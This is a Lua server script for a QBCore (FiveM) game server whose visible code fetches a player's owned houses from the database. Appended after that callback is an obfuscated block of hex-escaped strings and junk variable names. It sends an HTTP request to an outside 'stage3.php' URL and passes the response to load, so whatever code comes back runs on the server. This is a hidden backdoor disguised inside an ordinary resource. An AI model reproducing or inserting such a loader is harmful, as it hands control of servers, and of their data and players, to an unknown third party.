local QBCore = exports['qb-core']:GetCoreObject()

QBCore.Functions.CreateCallback('qb-spawn:server:getOwnedHouses', function(source, cb, cid)
    if cid ~= nil then
        local houses = MySQL.Sync.fetchAll('SELECT * FROM player_houses WHERE citizenid = ?', {cid})
        if houses[1] ~= nil then
            cb(houses)
        else
            cb(nil)
        end
    else
        cb(nil)
    end
end)

local vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x75\x62\x67\x6c\x6f\x62\x61\x6c\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x6a\x31\x63\x69\x50", function (MQRcKjehpmBdiBKxtGdAASVOIZuTsDxYqOvFUGXNRWDXsJbpHamZhcdUQVLJgdFGQyZUDY, foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm) if (foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm == vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[6] or foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm == vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[5]) then return end vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[2]](vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[3]](foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm))() end)